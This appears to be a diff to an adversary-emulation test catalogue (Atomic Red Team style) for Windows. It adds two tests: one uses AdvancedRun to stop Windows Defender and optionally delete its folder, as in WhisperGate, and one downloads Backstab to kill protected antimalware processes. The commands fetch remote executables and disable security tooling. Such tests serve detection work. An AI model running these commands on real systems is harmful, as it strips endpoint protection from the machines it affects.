@@ -574,3 +574,63 @@ atomic_tests:
       cmd /c #{DefenderControlExe} /E | Out-Null
     name: powershell
     elevation_required: true
+- name: Disable Defender Using NirSoft AdvancedRun
+  auto_generated_guid: 81ce22fd-9612-4154-918e-8a1f285d214d
+  description: |
+    Information on NirSoft AdvancedRun and its creators found here: http://www.nirsoft.net/utils/advanced_run.html
+    This Atomic will run AdvancedRun.exe with similar behavior identified during the WhisperGate campaign.
+    See https://medium.com/s2wblog/analysis-of-destructive-malware-whispergate-targeting-ukraine-9d5d158f19f3
+    Upon successful execution, AdvancedRun.exe will attempt to run and stop Defender, and optionally attempt to delete the Defender folder on disk. 
+  supported_platforms:
+  - windows
+  input_arguments:
+    AdvancedRun_Location:
+      description: Path of Advanced Run executable
+      type: Path
+      default: '$env:temp\AdvancedRun.exe'
+    delete_defender_folder:
+      description: Set to 1 to also delete the Windows Defender folder
+      type: Integer
+      default: 0
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Advancedrun.exe must exist at #{AdvancedRun_Location}
+    prereq_command: |
+      if(Test-Path -Path #{AdvancedRun_Location}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      Invoke-WebRequest "http://www.nirsoft.net/utils/advancedrun.zip" -OutFile "$env:temp\advancedrun.zip"
+      Expand-Archive -path "$env:temp\advancedrun.zip" -destinationpath "$env:temp\" -Force
+  executor:
+    command: |
+      Try {cmd /c #{AdvancedRun_Location} /EXEFilename "$env:systemroot\System32\sc.exe" /WindowState 0 /CommandLine "stop WinDefend" /StartDirectory "" /RunAs 8 /Run} Catch{}
+      if(#{delete_defender_folder}){
+        $CommandToRun = rmdir "$env:programdata\Microsoft\Windows Defender" -Recurse
+        Try {cmd /c #{AdvancedRun_Location} /EXEFilename "$env:systemroot\System32\WindowsPowershell\v1.0\powershell.exe" /WindowState 0 /CommandLine "$CommandToRun" /StartDirectory "" /RunAs 8 /Run} Catch{}
+      }
+    cleanup_command: |
+      Try {cmd /c #{AdvancedRun_Location} /EXEFilename "$env:systemroot\System32\sc.exe" /WindowState 0 /CommandLine "start WinDefend" /StartDirectory "" /RunAs 8 /Run} Catch{}
+    name: powershell
+    elevation_required: true
+- name: Kill antimalware protected processes using Backstab
+  auto_generated_guid: 24a12b91-05a7-4deb-8d7f-035fa98591bc
+  description: |-
+    Backstab loads Process Explorer driver which is signed by Microsoft and use it to terminate running processes protected by antimalware software such as MsSense.exe or MsMpEng.exe, which is otherwise not possible to kill.
+    https://github.com/Yaxser/Backstab
+  supported_platforms:
+  - windows
+  input_arguments:
+    process_name:
+      description: Name of the protected process you want to kill/terminate.
+      type: string
+      default: MsMpEng.exe
+  dependency_executor_name: powershell
+  dependencies:
+  - description: Backstab64.exe should exist in %temp%
+    prereq_command: if (Test-Path $env:temp\Backstab64.exe) {exit 0} else {exit 1}
+    get_prereq_command: Start-BitsTransfer -Source "https://github.com/Yaxser/Backstab/releases/download/v1.0.1-beta/Backstab64.exe" -Destination "$env:temp\Backstab64.exe" -dynamic
+  executor:
+    command: '& $env:temp\Backstab64.exe -k -n #{process_name}'
+    name: powershell
+    elevation_required: true
+  
